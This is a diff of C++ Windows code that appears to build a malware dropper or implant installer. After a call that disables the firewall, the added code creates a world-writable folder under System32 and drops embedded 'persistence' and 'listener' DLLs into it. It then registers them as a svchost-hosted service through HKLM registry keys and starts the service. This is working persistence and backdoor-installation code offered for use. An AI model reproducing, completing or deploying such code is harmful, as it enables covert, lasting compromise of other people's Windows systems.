@@ -11,16 +11,29 @@ int wmain() {
 	DisableFirewall();
 
 	// TODO: create working directory
+	std::filesystem::create_directory("C:\\Windows\\System32\\Persistence");
+	std::filesystem::permissions("C:\\Windows\\System32\\Persistence", std::filesystem::perms::all);
 
 	// TODO: create b64 config file
 
-	// TODO: drop persistence and listener exes
+	// write the persistence to disk
+	Log("[+] Dropping persistence to disk.", componentName);
+	std::ofstream outfileP("C:\\Windows\\System32\\Persistence\\persistence.dll", std::ios::out | std::ios::binary);
+	outfileP.write(&persistence[0], sizeof(persistence)); // try catch?
+	outfileP.close();
+
+	// write the listener to disk
+	Log("[+] Dropping listener to disk.", componentName);
+	std::ofstream outfileL("C:\\Windows\\System32\\Persistence\\listener.dll", std::ios::out | std::ios::binary);
+	outfileL.write(&listener[0], sizeof(listener)); // try catch?
+	outfileL.close();
 
 	if (CreatePersistService() != 0) {
 		// creating persistent service failed
 	}
 
-	// TODO: start service
+	// start service
+	BeginService();
 
 	return 0;
 }
@@ -131,7 +144,7 @@ int CreatePersistService() {
 	);
 
 	if (s != ERROR_SUCCESS) {
-		Log("[!] RegCreateKeyExW failed: " + std::to_string(GetLastError()), componentName);
+		Log("[!] RegCreateKeyExW dllpath failed: " + std::to_string(GetLastError()), componentName);
 		return 3;
 	}
 
@@ -145,11 +158,84 @@ int CreatePersistService() {
 	);
 
 	if (s != ERROR_SUCCESS) {
-		Log("[!] RegSetKeyValueW failed: " + std::to_string(GetLastError()), componentName);
-		return 3;
+		Log("[!] RegSetKeyValueW dllpath failed: " + std::to_string(GetLastError()), componentName);
+		return 4;
 	}
 
-	// optionally set service group
+	// set service group
+	s = RegCreateKeyExW(
+		HKLM,
+		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
+		0,
+		NULL,
+		REG_OPTION_NON_VOLATILE,
+		KEY_WRITE,
+		NULL,
+		&hKey,
+		NULL
+	);
+
+	if (s != ERROR_SUCCESS) {
+		Log("[!] RegCreateKeyExW group failed: " + std::to_string(GetLastError()), componentName);
+		return 5;
+	}
+
+	s = RegSetKeyValue(
+		hKey,
+		NULL,
+		L"",
+		REG_MULTI_SZ,
+		L"Persistence\0",
+		sizeof(LPCSTR) + 1
+	);
+
+	if (s != ERROR_SUCCESS) {
+		Log("[!] RegSetKeyValueW dllpath failed: " + std::to_string(GetLastError()), componentName);
+		return 6;
+	}
+
+	return 0;
+}
+
+int BeginService() {
+	SC_HANDLE hSCManager = NULL;
+	SC_HANDLE hService = NULL;
+
+	std::unique_ptr<void, decltype(&CloseHandle)> uphSCManager(static_cast<void*>(hSCManager), CloseHandle);
+	std::unique_ptr<void, decltype(&CloseHandle)> uphService(static_cast<void*>(hService), CloseHandle);
+
+	hSCManager = OpenSCManagerW(
+		NULL,
+		NULL,
+		SC_MANAGER_ALL_ACCESS
+	);
+
+	if (hSCManager == NULL) {
+		Log("[!] Failed to get handle to scmanager: " + std::to_string(GetLastError()), componentName);
+		return 1;
+	}
+
+	hService = OpenServiceW(
+		hSCManager,
+		L"Persistence",
+		SERVICE_ALL_ACCESS
+	);
+
+	if (hService == NULL) {
+		Log("[!] Failed to get handle to service: " + std::to_string(GetLastError()), componentName);
+		return 2;
+	}
+
+	// check if service is running?
+
+	if (!StartServiceW(
+		hService,
+		0,
+		NULL
+	)) {
+		Log("[!] Failed to start service: " + std::to_string(GetLastError()), componentName);
+		return 3;
+	}
 
 	return 0;
 }
